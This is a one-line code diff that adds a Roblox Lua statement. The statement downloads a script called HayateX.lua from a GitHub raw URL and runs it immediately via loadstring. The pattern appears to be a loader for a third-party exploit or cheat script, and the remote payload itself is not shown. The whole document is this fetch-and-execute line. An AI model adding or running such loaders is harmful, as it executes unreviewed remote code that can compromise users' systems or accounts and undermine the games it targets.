@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tp777927-byte/Id-map/main/HayateX.lua"))()
